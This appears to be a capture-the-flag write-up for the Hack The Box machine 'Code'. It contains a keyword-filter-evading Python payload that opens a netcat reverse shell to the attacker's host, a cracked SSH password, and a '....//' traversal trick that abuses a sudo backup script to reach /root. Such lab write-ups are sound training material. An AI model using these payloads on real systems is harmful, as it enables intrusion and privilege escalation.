```json
Alias: Code
Date: 24-03_2025
Platform: Hackthebox
OS: Linux
Difficulty: Easy
Status: Complete
IP: 10.10.11.62
```

# Code
# Summary

- Placeholder

# Used Tools

* Placeholder
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 05:50 PKT
Nmap scan report for 10.10.11.62
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.13 seconds

```

---
# Enumeration

Port 5000 has an online python interpreter, We can use this to get a reverse shell. The problem is that a few keywords such as import or `__import__` are banned. We can easily get around this in many ways, I came up with this code to get a shell

```python
imp = "__i.mport__"
o = "o.s"
sys = "s.ystem"
built = "__b.uiltins__"

imp = imp.replace(".", "")
o = o.replace(".", "")
sys = sys.replace(".", "")
built = built.replace(".", "")

module = globals()[built][imp](o)
func = getattr(module, sys)


print(func("busybox nc 10.10.14.245 4444 -e sh"))
print("done")
```


---

# Lateral Movement

After getting a shell, we can download the database.db file that is found in the `instances` directory. This contains two hashes, one of which is for martin. This can be cracked very quickly and we can SSH to the box as martin

| Username | Password           |
| -------- | ------------------ |
| martin   | nafeelswordsmaster |

---

# Privilege Escalation

If we do `sudo -l`, We see that we can run a script called `backy.sh` as root. The script creates backups but uses some substitution to remove `../` so we can't do directory traversals and only allows to backup `/home/` and `/var/`. This can easily be bypassed as such:

```json
{       
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/....//....//root"
	]
}
```

`untar` the archive in the destination and get root flag!

---

# Flags
- 2a2b16ec391044fbba27df67c03a0ec6

#CTF